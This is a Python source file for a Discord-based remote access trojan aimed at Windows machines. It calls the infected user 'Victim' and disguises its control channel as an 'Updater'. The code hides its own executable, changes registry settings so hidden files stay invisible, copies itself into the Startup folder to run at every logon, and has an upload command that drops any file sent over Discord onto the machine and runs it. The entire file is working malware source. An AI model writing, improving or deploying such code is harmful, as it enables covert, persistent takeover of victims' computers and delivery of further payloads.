from discord.ext import commands
import datetime
import asyncio
import discord
import shutil
import psutil
import winreg
import sys
import os
import re

TOKEN = "Discord bot token"  # Do not remove or modify this string (compiler looks for this) - 3f298h

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='$', intents=intents)

def sanitize_channel_name(name):
    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', name).lower()
    return sanitized

def bot_channel():
    raw_channel_name = f"Updater-{os.environ.get("COMPUTERNAME", "UnknownDevice")}-{os.getlogin()}"
    channel_name = sanitize_channel_name(raw_channel_name)
    return channel_name

@bot.command(help="Delete and recreates bots channel, wiping all the messages")
async def init(ctx):
    user = ctx.author

    if user.guild_permissions.administrator:
        channel_name = bot_channel()
        existing_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)

        if ctx.message.content.endswith("/f"):
            if existing_channel is not None:
                await existing_channel.delete()
            overwrites = {
                ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
            await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
        else:
            if existing_channel is None:
                overwrites = {
                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
                }
                new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
                await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
            else:
                await ctx.send("Channel already exists, please run `$init /f` to wipe the channel (delete and recreate).")
    else:
        await ctx.send("You don't have permission to initialize configuration for this guild.")

@bot.event
async def on_guild_join(guild):
    channel_name = bot_channel()
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)

    if existing_channel is None:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
        await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")
    else:
        await existing_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")

@bot.event
async def on_ready():
    for guild in bot.guilds:
        channel_name = bot_channel()
        existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
        logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S")

        if existing_channel is None:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
            await new_channel.edit(topic=logon_date)
            await new_channel.send(f"Victim has logged on! Use this channel for further commands.")
        else:
            await existing_channel.edit(topic=logon_date)
            await existing_channel.send(f"Victim has logged on! Use this channel for further commands.")
        print(f'Discord bot logged on as {bot.user.name}')

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    channel_name = bot_channel()
    if message.channel.name == channel_name:
        await bot.process_commands(message)

if getattr(sys, 'frozen', False):
    file_path = sys.executable 
else:
    file_path = __file__

if getattr(sys, 'frozen', False):
    new_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', os.path.basename(file_path))
else:
    new_path = file_path
    
@bot.command(help="Hides the script file and disables show hidden files.")
async def hidescript(ctx):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(reg_key)
        script_path = sys.executable
        os.system(f'attrib +h "{script_path}"')
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Makes this script execute on logon (only user that ran this file).")
async def startup(ctx):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(reg_key)
        
        script_path = sys.executable
        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
    
        if os.path.exists(startup_folder):
            script_name = os.path.basename(script_path)
    
            destination_path = os.path.join(startup_folder, script_name)
    
            shutil.copy(script_path, destination_path)
    
            print(f"Script '{script_name}' moved to the startup folder.")
            await ctx.send(f"Moved '{script_name}' to the startup folder.")
        else:
            await ctx.send(f"Startup folder \"{startup_folder}\" not found.")
        
        os.system(f'attrib +h "{destination_path}"')

    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

per_page = 10

@bot.command()
async def commands(ctx, page: int = 1):
    commands_list = list(bot.commands)

    max_page = (len(commands_list) - 1) // per_page + 1

    if page < 1 or page > max_page:
        await ctx.send(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    start_index = (page - 1) * per_page
    end_index = start_index + per_page
    commands_on_page = commands_list[start_index:end_index]

    embed = discord.Embed(
        title="Available Commands",
        description="List of all commands",
        color=0x007BFF
    )

    for command in commands_on_page:
        embed.add_field(
            name=command.name,
            value=command.help if command.help else "No description provided",
            inline=False
        )

    embed.set_footer(text=f"Page {page}/{max_page}")

    message = await ctx.send(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id

    while True:
        try:
            reaction, user = await bot.wait_for("reaction_add", check=check)
            await message.remove_reaction(reaction, user)
            
            if str(reaction.emoji) == "◀️" and page > 1:
                page -= 1
            elif str(reaction.emoji) == "▶️" and page < max_page:
                page += 1
            
            start_index = (page - 1) * per_page
            end_index = start_index + per_page
            commands_on_page = commands_list[start_index:end_index]

            embed.clear_fields()
            for command in commands_on_page:
                embed.add_field(
                    name=command.name,
                    value=command.help if command.help else "No description provided",
                    inline=False
                )
            
            embed.set_footer(text=f"Page {page}/{max_page}")

            await message.edit(embed=embed)

        except asyncio.TimeoutError:
            break

@bot.command(help=r"Format: $upload <filename (optional)> (file must be attached to message). If no filename is provided, the uploaded file's name is used. Kills the process for the specified file, deletes the file, uploads the new file from attachment, and runs it.")
async def upload(ctx, filename: str = ""):
    try:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach a file to upload.")
            return

        attachment = ctx.message.attachments[0]

        if filename == "":
            filename = attachment.filename

        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
        file_path = os.path.join(startup_folder, filename)

        if os.path.exists(file_path):
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == filename:
                    await ctx.send(f"Terminating process '{filename}'...")
                    proc.terminate()
                    proc.wait()
                    await ctx.send(f"Process '{filename}' terminated.")

            os.remove(file_path)
            await ctx.send(f"Deleted old file '{filename}'.")

        file_data = await attachment.read()

        with open(file_path, 'wb') as f:
            f.write(file_data)

        await ctx.send(f"Uploaded new file '{filename}'.")

        os.startfile(file_path)
        await ctx.send(f"File '{filename}' has been started.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Force stops the bot.")
async def estop(ctx):
    await ctx.send("Force stopping bot...")
    await bot.close()
    os._exit(0)

bot.run(TOKEN)
